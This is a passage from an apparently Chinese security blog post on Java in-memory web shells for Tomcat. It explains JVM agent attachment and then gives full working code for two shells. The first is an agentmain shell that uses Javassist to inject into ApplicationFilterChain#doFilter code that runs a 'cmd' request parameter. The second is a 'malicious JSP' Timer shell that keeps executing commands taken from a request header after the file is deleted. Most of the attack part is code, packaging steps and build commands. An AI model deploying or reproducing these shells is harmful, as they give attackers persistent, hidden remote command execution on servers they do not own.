<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br></pre></td></tr></table></figure></div>

<p><strong>loadAgent</strong>：向<code>jvm</code>注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用<code>ClassFileTransformer</code>接口中提供的方法进行处理。</p>
<p><strong>Detach</strong>：从 <code>JVM</code> 上面解除一个代理(agent)</p>
<h4 id="VirtualMachineDescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h4><p>VirtualMachineDescriptor 是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能。</p>
<p>所以最后我们的注入流程大致如下：</p>
<blockquote>
<p>通过 VirtualMachine 类的 attach(pid) 方法，可以 attach 到一个运行中的 java 进程上，之后便可以通过 loadAgent(agentJarPath) 来将agent 的 jar 包注入到对应的进程，然后对应的进程会调用agentmain方法。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\20210614164445.png"
                      alt="image-20210614164444958"
                ></p>
<h4 id="Demo（详情见源码）"><a href="#Demo（详情见源码）" class="headerlink" title="Demo（详情见源码）"></a>Demo（详情见源码）</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm AgentMain.jar koishiagent.mf KoishiAgent.class KoishiTransformer.class </span><br></pre></td></tr></table></figure></div>

<p>windows下需要将 jdk 的 tools.jar 自行添加到项目依赖，才能进行后续操作，不然会报错。</p>
<p>详情见项目源码</p>
<h4 id="agentmain-内存马"><a href="#agentmain-内存马" class="headerlink" title="agentmain 内存马"></a>agentmain 内存马</h4><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/KpLi0rn/AgentMemShell" >KpLi0rn&#x2F;AgentMemShell: JavaAgent内存马 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>其他师傅写好的测试项目</p>
<p>配合 Filter 的 <code>ApplicationFilterChain#doFilter</code>里面封装了用户请求的 request 和 response，我们能够注入，直接获取用户的请求，将执行结果写在 response 中进行返回</p>
<p><strong>ShellAgent.java</strong></p>
<p>首先注册我们的 DefineTransformer ，然后遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro.vuln.Java_Agent.agantmain.AgentShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellAgent</span> &#123;</span><br><span class="line">    <span class="comment">// 将目标类设置为我们最喜欢的 ApplicationFilterChain</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<p><strong>CirnoTransformer.java</strong></p>
<p>对 transform 拦截的类进行 if 判断，如果被拦截的 classname 等于 ApplicationFilterChain 的话那么就对其进行字节码动态修改</p>
<p>这里利用 insertBefore ，将其插入到前面，从而减少对原程序的功能破坏</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CirnoTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + ClassName);</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>在resources下创建 META-INF 目录，创建 MANIFEST.MF</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Agent-Class: ShellAgent</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>在pom中配置 maven 的 assembly 插件</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- get all project dependencies --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">&lt;!-- MainClass in mainfest make a executable jar --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Project-name</span>&gt;</span>$&#123;project.name&#125;<span class="tag">&lt;/<span class="name">Project-name</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Project-version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">Project-version</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>ShellAgent<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- bind to the packaging phase --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>使用assembly的插件下的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assembly:assembly</span><br></pre></td></tr></table></figure></div>

<p>或者命令行使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn assembly:assembly</span><br></pre></td></tr></table></figure></div>

<p>打包在target下会存在一个有依赖版本和无依赖版本</p>
<p>我们将 agent.jar 已经编写好了，接下来我们需要编写 java 代码来使其加载进去</p>
<p><del>然后配合Evil 类打字节马就行，但是tnnd又没成功，我真服了。。。后面再试吧，研究这个已经耽误2天了</del></p>
<p><del>这个比其他的要多使用一个jar包，挺麻烦的还</del></p>
<p>解决了，tnnd我真是个呆逼，恶意类又忘了继承 AbstractTranslet 类就加载字节码了，md今早上突然想起来了。。。。之前白辛苦搞那么久了，淦！</p>
<p><font color="red"><strong>下次一定一定要记得继承  AbstractTranslet 类！！！！！！！</strong></font></p>
<p>这个马也挺好用的</p>
<h2 id="十一、Timer-型内存马"><a href="#十一、Timer-型内存马" class="headerlink" title="十一、Timer 型内存马"></a>十一、Timer 型内存马</h2><p><a class="link"   target="_blank" rel="noopener" href="https://su18.org/post/memory-shell-2/" >JavaWeb 内存马二周目通关攻略 | 素十八 (su18.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>而 jsp 的本质，就是 servlet。 jsp 创建了一个 Timer 计时器对象，在访问了一次这个 jsp 后，会启动一个计时器进行无限循环，一次执行直到服务器重启。即使将这个 jsp 删除，依旧是会继续进行这个任务。</p>
<p>这里依旧以 Tomcat 为例，按照 Servlet 的特点，一个 Servlet 在注册时会被封装成 <code>org.apache.catalina.core.StandardWrapper</code>，在其 mappings 中添加类名，并将访问路径及类名的映射关系存储在 <code>org.apache.catalina.core.StandardContext#servletMappings</code> 中。</p>
</blockquote>
<p><strong>而 jsp 的本质，就是 servlet，只不过由 Tomcat 实现了动态转换、编译、加载、执行的过程</strong></p>
<p>接下来看下 JspServlet 的处理逻辑，总体来说分为三步:</p>
<ol>
<li>JSP 引擎将 <code>.jsp</code> 文件翻译成一个 servlet 源代码;</li>
<li>将 servlet 源代码编译成 <code>.class</code> 文件;</li>
<li>加载并执行这个编译后的文件。</li>
</ol>
<p><strong>一个 jsp 的生命周期</strong></p>
<ol>
<li>在 <code>JspCompilationContext#compile</code> 方法中，会调用 <code>this.jspCompiler.isOutDated()</code> 判断文件状态；</li>
<li>方法根据 <code>JspCompilationContext#getLastModified</code> 方法判断 JSP 本地 resource 是否存在，如果不存在，则通过将 <code>JspCompilationContext#removed</code> 标识为 true 来代表了文件已经被移除；</li>
<li>调用 <code>JspRuntimeContext#removeWrapper</code> 从 <code>JspRuntimeContext#jsps</code> 中移除访问路径与 wrapper 的映射；</li>
<li>随后会抛出 FileNotFoundException 异常，终止后续的处理逻辑。</li>
<li>被移除的 wrapper 因为失去了引用，将会被等待 GC。</li>
</ol>
<p>按理说JSP 被删除后，对应的访问映射不存在了，实际执行的 servlet 实例和 wrapper 对象失去了引用将会等待销毁，被销毁后，里面的代码自然就失效了。</p>
<p><strong>但是由于在恶意代码创建了 Timer 定时任务，而 Timer 会创建一个定时任务线程 TimerThread，Timer 的特性是，如果不是所有未完成的任务都已完成执行，或不调用 Timer 对象的<code> cancel</code> 方法，这个线程是不会停止，也不会被 GC 的，因此，这个任务会一直执行下去，直到应用关闭。</strong></p>
<h3 id="恶意jsp"><a href="#恶意jsp" class="headerlink" title="恶意jsp"></a>恶意jsp</h3><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashSet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Object&gt; <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                    <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                target = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">List</span> <span class="variable">processors</span> <span class="operator">=</span> (List) getField(target, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                                target = getField(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line"></span><br><span class="line">                                threadName = (String) target.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, String.class).invoke(target, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;koishi&quot;</span>));</span><br><span class="line">                                <span class="keyword">if</span> (threadName != <span class="literal">null</span> &amp;&amp; !threadName.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">note</span> <span class="operator">=</span> target.getClass().getDeclaredMethod(<span class="string">&quot;getNote&quot;</span>, <span class="type">int</span>.class).invoke(target, <span class="number">1</span>);</span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">req</span>  <span class="operator">=</span> note.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(note);</span><br><span class="line">                                    List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">                                    list.add(req);</span><br><span class="line">                                    list.add(threadName);</span><br><span class="line">                                    <span class="keyword">return</span> list;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getField</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> HashSet&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">    java.util.<span class="type">Timer</span> <span class="variable">executeSchedule</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Timer();</span><br><span class="line">    executeSchedule.schedule(<span class="keyword">new</span> <span class="title class_">java</span>.util.TimerTask() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            List&lt;Object&gt; list = getRequest();</span><br><span class="line">            <span class="keyword">if</span> (list.size() == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!set.contains(list.get(<span class="number">0</span>))) &#123;</span><br><span class="line">                    set.add(list.get(<span class="number">0</span>));</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Runtime.getRuntime().exec(list.get(<span class="number">1</span>).toString());</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>



